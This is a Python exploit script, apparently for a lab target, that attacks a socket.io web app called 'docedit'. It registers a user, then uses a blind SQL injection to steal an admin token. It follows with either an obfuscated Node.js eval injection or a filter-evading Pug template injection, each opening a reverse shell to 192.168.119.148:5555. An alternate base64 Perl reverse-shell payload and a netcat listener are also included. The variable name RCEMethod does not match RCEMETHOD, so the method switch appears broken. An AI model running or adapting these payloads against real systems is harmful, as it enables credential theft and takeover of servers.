import argparse
import re
import websocket
import os
from multiprocessing import Process
try:
    import thread
except ImportError:
    import _thread as thread
import time

#####################################
#SQLI Prep:

testChars=list(range(32,126))        #tests readable ascii characters, plus \n
testChars.insert(0,10)
letterGuessed=0
tokenFound=0
queryResults=[]

#myQuery='user()'
#myQuery='version()'
#myQuery='database()'
#myQuery="concat(table_schema, char(58), table_name, char(58), column_name) FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT 1,1"        #First Limit # is record offset; second is number of records to display (1 for us)
myQuery="concat(id, char(58), admin, char(58), password, char(58), email) from docedit.Users LIMIT 0,1"
myQuery="concat(id, char(58), token, char(58), UserId) from docedit.AuthTokens LIMIT 0,1"

finalQueryEncoding = [(' ','/**/')]
for L in finalQueryEncoding:
    myQuery=myQuery.replace(L[0],L[1])

#####################################
#WebSocket Message Analysis Functions:

def getAuthToken(message):
    if 'token' in message:
        global token
        token = re.findall('.*"token":"(.*)"', message)[0]

def getPostLogin(message):
    if 'Your user was registered.' in message:
        print('Your user was registered...')
    elif 'User with that email already exists' in message:
        print('User with that email already exists...')

def sqliParse(message):
    global letterGuessed
    if 'true' in message.lower():
        #print('Correct, moving to next position\n\n\n')
        letterGuessed=1
    else:
        #print('Incorrect, guess again')
        pass

#####################################
#WebSocket Core Functions:

def on_message(ws, message):
    global tokenFound
    if not tokenFound:
        getAuthToken(message)
    getPostLogin(message)
    #print(message)
    if 'emailFound' in message:
        sqliParse(message)

def on_error(ws, error):
    print(error)

def on_close(ws,code,msg):
    global RCEMETHOD
    print("### closed ###")
    
    #####################################
    #Post-Websocket Functions:   
    def openListener():
        listener = 'bash -c "nc -nvlp 5555"'
        print ("\nStarting listener on port 5555")
        from subprocess import call
        call(listener,shell=True)

    def triggerSSTIShell():
        time.sleep(3)
        trigger = 'bash -c "curl http://192.168.148.249/"'
        print ("\nTriggering via curl...")
        from subprocess import call
        call(trigger,shell=True)
    
    triggerProcess=Process(target=triggerSSTIShell)
    listenerProcess=Process(target=openListener)
    if RCEMETHOD == 'SSTI':
        triggerProcess.start()
    listenerProcess.start()  
   
def on_open(ws):
    global queryResults
    print("### Initiating new websocket connection ###")
    # Define Thread
    def run(*args):
        global tokenFound
        global adminToken
        global RCEMETHOD
        
        #Core SQLI Exploitation:
        def tokenSQLI():
            global letterGuessed
            global tokenFound
            print('\nTrying SQLI...')
            print('Query: '+myQuery+'\n')
            data = """42["checkEmail",{"token":"TOKEN","email":"zzz%'/**/or/**/(select/**/ascii(substring((select/**/[QUERY]),[OFFSET],1)))=[CHAR];#'"}]""".replace('TOKEN',token).replace('[QUERY]',myQuery)
            offset=1
            previousOffset=0
            for i in range(50):		#enough characters to hold the query results
                if offset==previousOffset:
                    print('++DONE OR ERROR...')
                    tokenFound=1
                    fullToken=''.join(queryResults)
                    s=fullToken.find(':')+1
                    e=fullToken.find(':',3)
                    t=fullToken[s:e]
                    return t
                letterGuessed=0
                d = data.replace("[OFFSET]", str(offset))
                previousOffset=offset
                #print('Finding offset: %s' %offset)
                for j in range(len(testChars)):
                    if letterGuessed:
                        letter=chr(testChars[j-1])
                        queryResults.append(letter)
                        offset+=1
                        #print('CURRENT RESULTS:')
                        print(''.join(queryResults))
                        #print(queryResults)
                        break
                    d2 = d.replace("[CHAR]", str(testChars[j]))
                    #print(d2)
                    ws.send(d2)
                    time.sleep(0.5)	#0.1 quicker, 0.5 less likely for errors
                    
        #Core Websocket Exploitation:
        while True:           
            # Create User
            print('Creating standard user...')
            data = '42["postRegister",{"firstName":"John","lastName":"Doe","email":"johndoe@email.com","password1":"password123","password2":"password123"}]'
            ws.send(data)
            time.sleep(1)

            # Authenticate
            print('Posting login to grab user token...')
            data = '42["postLogin",{"email":"johndoe@email.com","password":"password123"}]'
            ws.send(data)
            time.sleep(1)

            # User Token
            print(f"User Token: {token}")

            # SQLI - Steal Token:
            #tokenFound=1	#REMOVE - testing purposes
            #adminToken="3d7ed80dee5a1febd7880b77cb218582"	#only for testing
            if not tokenFound:
                adminToken=tokenSQLI()
                print('Admin Token Returned:')
                print(adminToken)              
            print('Switching to stolen admin token...')
            adminToken='"%s"' %adminToken      
                
         #################
         #RCE METHOD #1: NODEJS/JAVASCRIPT INJECTION:    
            if RCEMETHOD == 'JSINJECT':
                #payload="""abc'+eval(console.log('CODE_EXECUTION')))]//;"""  
                ##eval(require("child_process").exec('bash -c "bash -i >& /dev/tcp/192.168.119.148/5555 0>&1"'))  : 
                payload="""abc'+eval(Buffer.from('7265717569726528226368696C645F70726F6365737322292E65786563282762617368202D63202262617368202D69203E26202F6465762F7463702F3139322E3136382E3131392E3134382F3535353520303E2631222729','hex').toString('utf8')))]//;"""
                JSPayload = '42["togglePlugin",{"token":[ADMINTOKEN],"name":"[PAYLOAD]","enable":"false"}]'.replace('[ADMINTOKEN]',adminToken).replace('[PAYLOAD]',payload)            
                print(JSPayload)
                print('\nSending JS Injection RCE payload...')
                ws.send(JSPayload)
                time.sleep(1)
                print("\nthread terminating...")
                ws.close()
                time.sleep(30)
          
          
         #################
         #RCE METHOD #2: SSTI (PUG):
            elif RCEMETHOD == 'SSTI':
                #SSTIPayload = '42["updateSettings",{"token":[ADMINTOKEN],"homePage":"<h1>HACKED</h1>"}]'.replace('[ADMINTOKEN]',adminToken)
                #SSTIPayload = '42["updateSettings",{"token":[ADMINTOKEN],"homePage":"<h1>#{7*7}</h1>"}]'.replace('[ADMINTOKEN]',adminToken) 
                #evading filter by using hex character:
                payload="""#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\\"child_p\\\\x72ocess\\").exec('bash -c \\"sh -i >& /dev/tcp/192.168.119.148/5555 0>&1\\"')}()}""" 
                #Or:
                #payload="""#{spawn_sync = this.process.binding('spawn_sync')};#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}};#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}};#{payload='dXNlIFNvY2tldDskaT0iMTkyLjE2OC4xMTkuMTQ4IjskcD01NTU1O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Ow=='};#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}"""           
                SSTIPayload = '42["updateSettings",{"token":[ADMINTOKEN],"homePage":"<h1>[PAYLOAD]</h1>"}]'.replace('[ADMINTOKEN]',adminToken).replace('[PAYLOAD]',payload)            
                #print(SSTIPayload)
                print('\nSending Pug SSTI RCE payload...')
                ws.send(SSTIPayload)
                time.sleep(1)
                # Clean up
                print("\nthread terminating...")
                ws.close()
                time.sleep(30)
    
    # Run thread, run.
    thread.start_new_thread(run, ())

def initiate(target, debug, verbose):
    websocket.enableTrace(verbose)
    ws = websocket.WebSocketApp(f"ws://{target}/socket.io/?EIO=3&transport=websocket&t=NMxgB5J&sid=",
        on_message = on_message,
        on_error = on_error,
        on_close = on_close)
    ws.on_open = on_open
    if debug:
        ws.run_forever(http_proxy_host='127.0.0.1', http_proxy_port=8080)
    else:
        ws.run_forever()

def main():
    global RCEMethod
    RCEMethod='JSINJECT'	#CHANGE HERE
    #RCEMethod='SSTI'
    
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', help='Target URL', required=True)
    parser.add_argument('-d','--debug', help='Instruct our web requests to use a proxy', action='store_true', required=False)
    parser.add_argument('-v','--verbose', help='Enable verbose tracing with our websocket', action='store_true', required=False)
    args = parser.parse_args()
    
      
    # Set some variables
    target = args.target
    
    # Debugging
    if args.debug:
        print('Websocket is going through our defined proxy')
    
    # H4ck the things
    initiate(target, args.debug, args.verbose)


if __name__ == "__main__":
    main()
